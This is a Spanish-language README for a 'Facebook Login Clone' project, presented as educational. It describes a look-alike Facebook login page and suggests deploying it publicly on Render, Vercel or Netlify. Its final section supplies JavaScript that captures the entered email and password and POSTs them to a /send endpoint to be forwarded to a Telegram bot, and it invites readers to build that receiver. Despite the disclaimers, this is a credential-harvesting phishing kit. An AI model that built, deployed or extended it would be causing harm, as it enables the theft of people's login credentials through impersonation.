# 📘 Facebook Login Clone - Proyecto Educativo

> ⚠️ **Este proyecto es únicamente con fines educativos y de práctica. No está afiliado ni pretende suplantar a Facebook en ningún aspecto.**

Este es un laboratorio práctico donde se clona visualmente la página principal de Facebook. El propósito es comprender mejor la estructura HTML, estilos CSS, e interacción básica con formularios y JavaScript.  
Ideal para estudiantes, desarrolladores en formación o entusiastas del desarrollo web que buscan mejorar sus habilidades.

---

## ✨ Características

- 🔹 Interfaz visual muy similar al login original de Facebook.
- 🔹 Uso de HTML5, CSS3 y JavaScript puro.
- 🔹 Simulación de envío de formularios.
- 🔹 Diseño adaptable con elementos de footer y multilenguaje como en la versión real.
- 🔹 Estructura de proyecto ordenada y fácil de modificar.

---

## 📂 Estructura del Proyecto

```
facebook-clone/
├── css/
│   └── styles.css
├── images/
│   ├── fb.ico
│   └── logo.svg
├── index.html
└── README.md
```

---

## 🧠 ¿Qué puedes aprender con este proyecto?

- Cómo estructurar una landing page moderna.
- Uso de formularios y eventos en JavaScript.
- Aplicar estilos similares a interfaces reales con CSS.
- Buenas prácticas al organizar archivos en un proyecto frontend.
- Introducción a la simulación de interacciones cliente-servidor.

---

## 🚀 ¿Cómo usarlo?

1. Clona este repositorio:
   ```bash
   git clone https://github.com/santipj/Facebook-Login-Clone.git
   ```
2. Abre el archivo `index.html` con tu navegador.
3. Explora, modifica y experimenta.

> Puedes desplegarlo fácilmente en plataformas como **Render**, **Vercel** o **Netlify** para compartirlo con otros.

---

## ⚠️ Importante

Este proyecto **no debe usarse con fines maliciosos**. Fue creado para aprender cómo se construyen interfaces web complejas desde cero. Cualquier uso indebido es responsabilidad del usuario.

---

## 📬 ¿Tienes ideas o sugerencias?

¡Los pull requests, estrellas ⭐ y forks son bienvenidos! Si tienes ideas para mejorar este proyecto o quieres compartir tu versión, no dudes en contribuir.

---

## 🧑‍💻 Autor

Desarrollado por [Santipj](https://github.com/santipj) como parte de su aprendizaje en desarrollo web y ciberseguridad.

---

## 📝 Licencia

Este proyecto se distribuye bajo la Licencia MIT.


---

## 🤖 Integración con Bot de Telegram (Simulación de Envío de Datos)

Este proyecto incluye una función JavaScript que **simula** el envío de las credenciales ingresadas en el formulario a un bot de Telegram. Esta funcionalidad permite practicar cómo enviar datos desde el frontend hacia un backend (en este caso simulado como `/send`).

### 📦 Código relevante (`index.html`)

```html
<script>
  function sendToTelegram(event) {
    event.preventDefault(); // Evita que recargue la página

    const email = document.getElementById("Email").value;
    const pass = document.getElementById("Password").value;

    fetch("/send", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        message: `📥 Nuevo login:\n👤 Email: ${email}\n🔐 Password: ${pass}`
      })
    })
    .then(res => res.text())
    .then(data => {
      console.log("Respuesta del servidor:", data);
    })
    .catch(err => {
      console.error("Error al enviar:", err);
    });
  }
</script>
```

⚠️ **Advertencia:** Esta función no enviará nada a Telegram si no existe un backend implementado para recibir las solicitudes POST en la ruta `/send`. Se recomienda **NO usar esta funcionalidad en entornos reales sin control** y únicamente con fines de aprendizaje.

Puedes implementar fácilmente el receptor en Node.js, Python Flask, o cualquier otro backend que reenvíe los datos a la API oficial de Telegram Bots.

